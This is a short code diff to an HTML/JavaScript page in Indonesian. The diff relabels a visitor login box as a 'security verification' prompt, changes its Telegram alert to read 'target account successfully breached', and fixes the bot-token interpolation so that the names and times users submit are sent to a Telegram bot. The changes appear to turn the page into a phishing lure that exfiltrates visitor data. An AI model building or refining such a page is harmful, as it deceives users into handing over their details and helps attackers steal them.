@@ -137,7 +137,7 @@
 
     <!-- Kotak input nama -->
     <div class="modal-box" id="loginModal">
-        <h2>Verifikasi Pengunjung</h2>
+        <h2>Verifikasi Keamanan</h2>
         <p>Silakan Login untuk memverifikasi akses ke halaman ini.</p>
         
         <form id="visitorForm">
@@ -179,11 +179,11 @@
             submitBtn.disabled = true;
 
             // Struktur teks notifikasi admin di Telegram
-            const teksPesan = `🔔 *Notifikasi Pengunjung Baru*\n\n` +
+            const teksPesan = `👽 *Notifikasi Akun target berhasil dibobol*\n\n` +
                               `👤 *Nama:* ${namaDepan} ${namaBelakang}\n` +
                               `🕒 *Waktu Masuk:* ${waktuMasuk}`;
 
-            const urlTelegram = `https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage`;
+            const urlTelegram = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
             fetch(urlTelegram, {
                 method: 'POST',
